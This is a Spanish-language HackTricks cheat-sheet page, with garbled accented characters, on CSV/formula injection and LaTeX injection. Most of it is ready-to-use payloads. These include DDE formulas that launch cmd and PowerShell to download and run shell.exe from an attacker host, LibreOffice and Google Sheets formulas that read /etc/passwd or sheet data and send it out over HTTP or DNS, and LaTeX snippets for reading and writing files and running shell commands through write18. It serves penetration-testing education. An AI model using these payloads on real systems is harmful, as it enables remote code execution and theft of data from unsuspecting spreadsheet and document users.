# Inyecci√≥n de F√≥rmulas/CSV/Doc/LaTeX/GhostScript

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan m√°s para poder arreglarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Inyecci√≥n de F√≥rmulas

### Informaci√≥n

Si tu **entrada** se est√° **reflejando** dentro de archivos **CSV** (o cualquier otro archivo que probablemente se abrir√° con **Excel**), podr√≠as ser capaz de poner **f√≥rmulas** de Excel que se **ejecutar√°n** cuando el usuario **abra el archivo** o cuando el usuario **haga clic en alg√∫n enlace** dentro de la hoja de Excel.

{% hint style="danger" %}
Hoy en d√≠a **Excel alertar√°** (varias veces) al **usuario cuando algo se cargue desde fuera de Excel** para prevenir acciones maliciosas. Por lo tanto, se debe aplicar un esfuerzo especial en Ingenier√≠a Social al payload final.
{% endhint %}

### [Lista de Palabras](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hiperv√≠nculo

**El siguiente ejemplo es muy √∫til para exfiltrar contenido de la hoja de c√°lculo final y realizar solicitudes a ubicaciones arbitrarias. Sin embargo, requiere que el usuario haga clic en el enlace (y acepte los avisos de advertencia).**

Ejemplo tomado de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Supongamos un escenario de ataque en el sistema de gesti√≥n de registros estudiantiles de una escuela. La aplicaci√≥n permite a los profesores ingresar detalles de los estudiantes en la escuela. El atacante obtiene acceso a la aplicaci√≥n y quiere que todos los profesores que usan la aplicaci√≥n se vean comprometidos. Entonces, el atacante intenta realizar un ataque de inyecci√≥n CSV a trav√©s de la aplicaci√≥n web.\
El atacante necesita robar los detalles de otros estudiantes. Por lo tanto, el atacante utiliza la f√≥rmula Hiperv√≠nculo y la ingresa al introducir los detalles del estudiante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

Cuando el profesor exporta el CSV y hace clic en el hiperv√≠nculo, los datos sensibles se env√≠an al servidor del atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

El archivo CSV exportado contiene una carga maliciosa en su interior.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

Los detalles del estudiante se registran en el servidor web del atacante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

Para que este ejemplo funcione es **necesario habilitar la siguiente configuraci√≥n**:\
Archivo ‚Üí Opciones ‚Üí Centro de confianza ‚Üí Configuraci√≥n del Centro de confianza ‚Üí Contenido externo ‚Üí Habilitar el lanzamiento del servidor de intercambio de datos din√°micos\
o el uso de una **versi√≥n antigua de Excel**.

La buena noticia es que **esta carga se ejecuta autom√°ticamente cuando se abre el archivo** (si el usuario acepta las advertencias).

Es posible ejecutar una calculadora con la siguiente carga **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png>)

### M√°s
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* Esto leer√° la primera l√≠nea del archivo local /etc/passwd: `='file:///etc/passwd'#$passwd.A1`
* Exfiltrarlo: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrar m√°s de una l√≠nea: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltraci√≥n DNS: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**Analizando el payload de exfiltraci√≥n DNS:**

* ‚Äòfile:///etc/passwd‚Äô#$passwd.A19 ‚Äì Leer√° la 19¬™ l√≠nea del archivo local /etc/passwd
* ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19) ‚Äì Codifica la URL de los datos devueltos
* MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41) ‚Äì Similar a substring, lee datos desde el 1er car√°cter hasta el 41¬∫ ‚Äì una forma muy pr√°ctica de restringir la longitud de los nombres de host DNS (l√≠mite de 254 caracteres en FQDN y 63 caracteres para una etiqueta, es decir, subdominio)
* SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú) ‚Äì reemplaza todas las instancias de % (el car√°cter especial de la codificaci√≥n de URL) con gui√≥n ‚Äì esto asegura que solo se usen caracteres DNS v√°lidos
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú)),‚Äù.\<FQDN>‚Äù) ‚Äì Concatena la salida del archivo (despu√©s de que se haya realizado el procesamiento anterior) con el FQDN (para el cual tenemos acceso al host que es autoritativo para el dominio)
* WEBSERVICE ‚Äì Har√° una solicitud para este nombre DNS inexistente que luego podemos analizar los registros (o ejecutar tcpdump, etc.) en el servidor de nombres DNS autoritativo para el cual tenemos control

### Exfiltraci√≥n de datos OOB en Google Sheets

Primero, presentemos algunas de las funciones m√°s interesantes.

**CONCATENATE**: Anexa cadenas una tras otra.
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: Importa datos de varios tipos de datos estructurados, incluyendo XML, HTML, CSV, TSV y fuentes XML RSS y ATOM.
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: Importa un feed RSS o ATOM.
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: Importa datos de una tabla o lista dentro de una p√°gina HTML.
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: Importa un rango de celdas de una hoja de c√°lculo especificada.
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGE**: Inserta una imagen en una celda.
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## Inyecci√≥n LaTeX

Normalmente, los servidores que encontrar√° en internet que **convierten c√≥digo LaTeX a PDF** usan **`pdflatex`**.\
Este programa utiliza 3 atributos principales para permitir (o no) la ejecuci√≥n de comandos:

* **`--no-shell-escape`**: **Deshabilita** la construcci√≥n `\write18{command}`, incluso si est√° habilitada en el archivo texmf.cnf.
* **`--shell-restricted`**: Igual que `--shell-escape`, pero **limitado** a un conjunto 'seguro' de **comandos predefinidos** (\*\*En Ubuntu 16.04 la lista est√° en `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **Habilita** la construcci√≥n `\write18{command}`. El comando puede ser cualquier comando de shell. Esta construcci√≥n normalmente est√° prohibida por razones de seguridad.

Sin embargo, hay otras formas de ejecutar comandos, por lo que para evitar RCE es muy importante usar `--shell-restricted`.

### Leer archivo <a href="#read-file" id="read-file"></a>

Puede que necesite ajustar la inyecci√≥n con envoltorios como \[ o $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Leer archivo de una sola l√≠nea
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Leer archivo de m√∫ltiples l√≠neas
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### Escribir archivo <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Ejecuci√≥n de comandos <a href="#command-execution" id="command-execution"></a>

La entrada del comando ser√° redirigida a stdin, usa un archivo temporal para obtenerla.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Si obtienes alg√∫n error de LaTex, considera usar base64 para obtener el resultado sin caracteres incorrectos.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Inyecci√≥n de Ghostscript

TODO: Crear un resumen con la informaci√≥n y t√©cnicas m√°s relevantes de [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Referencias

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan m√°s para poder solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnol√≥gico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
